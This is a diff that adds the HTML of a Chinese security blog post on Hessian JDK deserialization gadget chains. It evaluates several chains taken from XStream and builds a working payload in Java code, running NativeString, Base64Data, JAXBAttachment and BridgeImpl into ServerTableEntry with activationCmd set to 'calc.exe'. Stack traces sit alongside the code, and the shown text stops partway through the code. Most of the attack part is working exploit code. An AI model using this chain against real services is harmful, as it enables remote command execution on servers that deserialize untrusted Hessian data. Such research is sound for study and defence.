@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/css/images/bg/favicon.ico">
+  <link rel="icon" type="image/png" href="/css/images/bg/favicon.ico">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="摸鱼">
+  <meta name="author" content="Aluvion">
+  <meta name="keywords" content="">
+  <title>Hessian JDK反序列化漏洞 - Twings</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css" />
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+
+  <link  rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css" />
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+<!-- 自定义样式保持在最底部 -->
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Twings</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">标签</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">关于</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">友链</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/css/images/bg/bg5.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  星期四, 二月 9日 2023, 11:48 晚上
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    1.4k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      7 分钟
+                  </span>
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
+                    <i class="far fa-eye" aria-hidden="true"></i>
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>学习！</p>
+<span id="more"></span>
+
+<hr>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>只需要一个Hessian依赖：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.caucho<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hessian<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.66<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>序列化和反序列化使用Hessian2：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object o) &#123;</span><br><span class="line">    <span class="type">byte</span>[] bytes = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">ho</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(bos);</span><br><span class="line">        ho.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        ho.writeObject(o);</span><br><span class="line">        ho.flushBuffer();</span><br><span class="line">        bytes = bos.toByteArray();</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">hi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(is);</span><br><span class="line">        o = hi.readObject();</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> o;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Hessian可以理解为存在类型限制（如Map和Iterator等类型在反序列化时可能受到限制）且不要求可序列化的反序列化，可以类比Xstream和Fastjson。</p>
+<h3 id="Xstream-ContainsFilter利用链"><a href="#Xstream-ContainsFilter利用链" class="headerlink" title="Xstream ContainsFilter利用链"></a>Xstream ContainsFilter利用链</h3><p>ContainsFilter只有从FilterIterator来的调用方式，然而Hessian在反序列化Iterator时使用的是IteratorDeserializer，其readList函数如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ArrayList</span> <span class="variable">list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line"></span><br><span class="line">in.addRef(list);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (! in.isEnd())</span><br><span class="line">    list.add(in.readObject());</span><br><span class="line"></span><br><span class="line">in.readEnd();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> list.iterator();</span><br></pre></td></tr></table></figure>
+
+<p>类型被限定为了ArrayList，无法正常反序列化Iterator类。</p>
+<p>而且ContainsFilter继承自ServiceRegistry.Filter，该接口下的filter函数需要一个参数，也无法通过AnnotationInvocationHandler调用。</p>
+<h3 id="XStream-InitialContext"><a href="#XStream-InitialContext" class="headerlink" title="XStream InitialContext"></a>XStream InitialContext</h3><p>貌似有一个以MultiUIDefaults为入口的利用链：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">XString#equal-&gt;</span><br><span class="line">    MultiUIDefaults#toString-&gt;</span><br><span class="line">        UIDefaults#get-&gt;</span><br><span class="line">            UIDefaults#getFromHashTable-&gt;</span><br><span class="line">                UIDefaults$LazyValue#createValue-&gt;</span><br><span class="line">                    SwingLazyValue#createValue-&gt;</span><br><span class="line">                        InitialContext#doLookup()</span><br></pre></td></tr></table></figure>
+
+<p>看起来是JNDI注入，不怎么有趣。这条链因为MultiUIDefaults继承自Map，虽然它有public的无参构造函数，但是因为MapDeserializer实例化时用的是constructor + newInstance()的方式而不是一般类所用的_unsafe.allocateInstance(_type)，所以MultiUIDefaults就会因为不是public类而无法实例化。</p>
+<h3 id="ServerTableEntry-GetterSetterReflection"><a href="#ServerTableEntry-GetterSetterReflection" class="headerlink" title="ServerTableEntry + GetterSetterReflection"></a>ServerTableEntry + GetterSetterReflection</h3><p>按正常反序列化流程会从RequestContext开始，然而它是一个Map，而且没有无参构造函数，于是就被Hessian鲨了。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Constructor&lt;?&gt; []ctors = type.getConstructors();</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; ctors.length; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (ctors[i].getParameterTypes().length == <span class="number">0</span>)</span><br><span class="line">    _ctor = ctors[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (_ctor == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">    _ctor = HashMap.class.getConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>MapDeserializer只要public的无参构造函数，不然把Map全都给你整成HashMap。</p>
+<p>找找还有什么地方调用了JAXBAttachment.asInputStream，找到了同类下的getInputStream函数：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> InputStream <span class="title function_">getInputStream</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.asInputStream();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>再往上一找，会发现Base64Data.get：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">byte</span>[] get() &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.data == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStreamEx</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStreamEx</span>(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="built_in">this</span>.dataHandler.getDataSource().getInputStream();</span><br><span class="line">        baos.readFrom(is);</span><br><span class="line">        is.close();</span><br><span class="line">        <span class="built_in">this</span>.data = baos.getBuffer();</span><br><span class="line">        <span class="built_in">this</span>.dataLen = baos.size();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException var3) &#123;</span><br><span class="line">        <span class="built_in">this</span>.dataLen = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>非常眼熟，这不就是Xstream反序列化漏洞中用到过的类吗，简单测试一下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">JAXBAttachment</span> <span class="variable">jaxbAttachment</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JAXBAttachment</span>(<span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">DataHandler</span> <span class="variable">dataHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataHandler</span>(jaxbAttachment);</span><br><span class="line"></span><br><span class="line"><span class="type">Base64Data</span> <span class="variable">base64Data</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Base64Data</span>();</span><br><span class="line">Utils.setField(base64Data, <span class="string">&quot;dataHandler&quot;</span>, dataHandler);</span><br><span class="line"></span><br><span class="line"><span class="type">Object</span> <span class="variable">nativeString</span> <span class="operator">=</span> Utils.createWithoutConstructor(<span class="string">&quot;jdk.nashorn.internal.objects.NativeString&quot;</span>);</span><br><span class="line">Utils.setField(nativeString, <span class="string">&quot;value&quot;</span>, base64Data);</span><br><span class="line"></span><br><span class="line">Map&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">Object[] table = (Object[])Utils.getFieldValue(map, <span class="string">&quot;table&quot;</span>);</span><br><span class="line">Utils.setField(table[<span class="number">1</span>], <span class="string">&quot;key&quot;</span>, nativeString);</span><br><span class="line"></span><br><span class="line"><span class="type">byte</span>[] bytes = serialize(map);</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> unserialize(bytes);</span><br></pre></td></tr></table></figure>
+
+<p>发现在反序列化过程中正常走到了JAXBAttachment.writeTo函数：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">java.lang.NullPointerException</span><br><span class="line">	at com.sun.xml.internal.ws.message.JAXBAttachment.writeTo(JAXBAttachment.java:<span class="number">109</span>)</span><br><span class="line">	at com.sun.xml.internal.ws.message.JAXBAttachment.asInputStream(JAXBAttachment.java:<span class="number">99</span>)</span><br><span class="line">	at com.sun.xml.internal.ws.message.JAXBAttachment.getInputStream(JAXBAttachment.java:<span class="number">125</span>)</span><br><span class="line">	at com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data.get(Base64Data.java:<span class="number">181</span>)</span><br><span class="line">	at com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data.toString(Base64Data.java:<span class="number">286</span>)</span><br><span class="line">	at jdk.nashorn.internal.objects.NativeString.getStringValue(NativeString.java:<span class="number">121</span>)</span><br><span class="line">	at jdk.nashorn.internal.objects.NativeString.hashCode(NativeString.java:<span class="number">117</span>)</span><br><span class="line">	at java.util.HashMap.hash(HashMap.java:<span class="number">341</span>)</span><br><span class="line">	at java.util.HashMap.put(HashMap.java:<span class="number">614</span>)</span><br><span class="line">	at com.caucho.hessian.io.MapDeserializer.readMap(MapDeserializer.java:<span class="number">114</span>)</span><br><span class="line">	at com.caucho.hessian.io.SerializerFactory.readMap(SerializerFactory.java:<span class="number">577</span>)</span><br><span class="line">	at com.caucho.hessian.io.Hessian2Input.readObject(Hessian2Input.java:<span class="number">2093</span>)</span><br><span class="line">	at org.example.App.unserialize(App.java:<span class="number">63</span>)</span><br><span class="line">	at org.example.App.main(App.java:<span class="number">38</span>)</span><br></pre></td></tr></table></figure>
+
+<p>继续构造，BridgeImpl类的构造比较麻烦，下一步的MarshallerImpl对象要从其父类Bridge的marshal函数中获得，调用链比较复杂：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Marshaller</span> <span class="variable">m</span> <span class="operator">=</span> (Marshaller)<span class="built_in">this</span>.context.marshallerPool.take();</span><br></pre></td></tr></table></figure>
+
+<p>marshallerPool.take是一个抽象类Impl中定义的函数：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> T <span class="title function_">take</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">T</span> <span class="variable">t</span> <span class="operator">=</span> <span class="built_in">this</span>.getQueue().poll();</span><br><span class="line">    <span class="keyword">return</span> t == <span class="literal">null</span> ? <span class="built_in">this</span>.create() : t;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> ConcurrentLinkedQueue&lt;T&gt; <span class="title function_">getQueue</span><span class="params">()</span> &#123;</span><br><span class="line">    WeakReference&lt;ConcurrentLinkedQueue&lt;T&gt;&gt; q = <span class="built_in">this</span>.queue;</span><br><span class="line">    ConcurrentLinkedQueue d;</span><br><span class="line">    <span class="keyword">if</span> (q != <span class="literal">null</span>) &#123;</span><br><span class="line">        d = (ConcurrentLinkedQueue)q.get();</span><br><span class="line">        <span class="keyword">if</span> (d != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> d;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    d = <span class="keyword">new</span> <span class="title class_">ConcurrentLinkedQueue</span>();</span><br><span class="line">    <span class="built_in">this</span>.queue = <span class="keyword">new</span> <span class="title class_">WeakReference</span>(d);</span><br><span class="line">    <span class="keyword">return</span> d;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>需要构造一个包含ConcurrentLinkedQueue的WeakReference，WeakReference类的get函数很好控制：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> T <span class="title function_">get</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.referent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>而这个抽象类Impl最后被实例化为了匿名类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">this</span>.marshallerPool = <span class="keyword">new</span> <span class="title class_">Impl</span>&lt;Marshaller&gt;() &#123;</span><br><span class="line">    <span class="meta">@NotNull</span></span><br><span class="line">    <span class="keyword">protected</span> Marshaller <span class="title function_">create</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> JAXBContextImpl.<span class="built_in">this</span>.createMarshaller();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>此外的问题也比较多，一步步调试最后构造出对象：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">JAXBContextImpl.<span class="type">JAXBContextBuilder</span> <span class="variable">jAXBContextBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">com</span>.sun.xml.internal.bind.v2.runtime.JAXBContextImpl.JAXBContextBuilder();</span><br><span class="line">jAXBContextBuilder.setClasses(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;);</span><br><span class="line"><span class="type">Object</span> <span class="variable">jaxbContext</span> <span class="operator">=</span> jAXBContextBuilder.build();</span><br><span class="line"></span><br><span class="line"><span class="type">Object</span> <span class="variable">marshaller</span> <span class="operator">=</span> Utils.createWithoutConstructor(<span class="string">&quot;com.sun.xml.internal.bind.v2.runtime.MarshallerImpl&quot;</span>);</span><br><span class="line">Utils.setField(marshaller, <span class="string">&quot;encoding&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">Utils.setField(marshaller, <span class="string">&quot;context&quot;</span>, jaxbContext);</span><br><span class="line">Constructor&lt;?&gt; c = XMLSerializer.class.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">c.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">xmlSerializer</span> <span class="operator">=</span> c.newInstance(marshaller);</span><br><span class="line">Utils.setField(marshaller, <span class="string">&quot;serializer&quot;</span>, xmlSerializer);</span><br><span class="line"></span><br><span class="line"><span class="type">ConcurrentLinkedQueue</span> <span class="variable">concurrentLinkedQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConcurrentLinkedQueue</span>();</span><br><span class="line">concurrentLinkedQueue.add(marshaller);</span><br><span class="line"><span class="type">WeakReference</span> <span class="variable">weakReference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WeakReference</span>(concurrentLinkedQueue);</span><br><span class="line"><span class="type">Object</span> <span class="variable">marshallerPool</span> <span class="operator">=</span> Utils.getFieldValue(jaxbContext, <span class="string">&quot;marshallerPool&quot;</span>);</span><br><span class="line">Utils.setField(marshallerPool, <span class="string">&quot;queue&quot;</span>, weakReference);</span><br><span class="line"></span><br><span class="line"><span class="type">Method</span> <span class="variable">verify</span> <span class="operator">=</span> ServerTableEntry.class.getMethod(<span class="string">&quot;verify&quot;</span>);</span><br><span class="line">Accessor.<span class="type">GetterSetterReflection</span> <span class="variable">getterSetterReflection</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Accessor</span>.GetterSetterReflection(verify, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Object</span> <span class="variable">classBeanInfo</span> <span class="operator">=</span> Utils.createWithoutConstructor(<span class="string">&quot;com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl&quot;</span>);</span><br><span class="line">Utils.setField(classBeanInfo, <span class="string">&quot;jaxbType&quot;</span>, ServerTableEntry.class);</span><br><span class="line">Utils.setField(classBeanInfo, <span class="string">&quot;uriProperties&quot;</span>, <span class="keyword">new</span> <span class="title class_">Property</span>[]&#123;&#125;);</span><br><span class="line">Utils.setField(classBeanInfo, <span class="string">&quot;inheritedAttWildcard&quot;</span>, getterSetterReflection);</span><br><span class="line"></span><br><span class="line"><span class="type">Object</span> <span class="variable">bridgeImpl</span> <span class="operator">=</span> Utils.createWithoutConstructor(<span class="string">&quot;com.sun.xml.internal.bind.v2.runtime.BridgeImpl&quot;</span>);</span><br><span class="line">Utils.setField(bridgeImpl, <span class="string">&quot;context&quot;</span>, jaxbContext);</span><br><span class="line">Utils.setField(bridgeImpl, <span class="string">&quot;bi&quot;</span>, classBeanInfo);</span><br><span class="line"></span><br><span class="line"><span class="type">BridgeWrapper</span> <span class="variable">bridgeWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BridgeWrapper</span>(<span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">Utils.setField(bridgeWrapper, <span class="string">&quot;bridge&quot;</span>, bridgeImpl);</span><br><span class="line"></span><br><span class="line"><span class="type">Object</span> <span class="variable">serverTableEntry</span> <span class="operator">=</span> Utils.createWithoutConstructor(<span class="string">&quot;com.sun.corba.se.impl.activation.ServerTableEntry&quot;</span>);</span><br><span class="line">Utils.setField(serverTableEntry, <span class="string">&quot;activationCmd&quot;</span>, <span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line"><span class="type">JAXBAttachment</span> <span class="variable">jaxbAttachment</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JAXBAttachment</span>(<span class="literal">null</span>, serverTableEntry, bridgeWrapper, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">DataHandler</span> <span class="variable">dataHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataHandler</span>(jaxbAttachment);</span><br><span class="line"></span><br><span class="line"><span class="type">Base64Data</span> <span class="variable">base64Data</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Base64Data</span>();</span><br><span class="line">Utils.setField(base64Data, <span class="string">&quot;dataHandler&quot;</span>, dataHandler);</span><br><span class="line"></span><br><span class="line"><span class="type">Object</span> <span class="variable">nativeString</span> <span class="operator">=</span> Utils.createWithoutConstructor(<span class="string">&quot;jdk.nashorn.internal.objects.NativeString&quot;</span>);</span><br><span class="line">Utils.setField(nativeString, <span class="string">&quot;value&quot;</span>, base64Data);</span><br><span class="line"></span><br><span class="line">Map&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">Object[] table = (Object[])Utils.getFieldValue(map, <span class="string">&quot;table&quot;</span>);</span><br><span 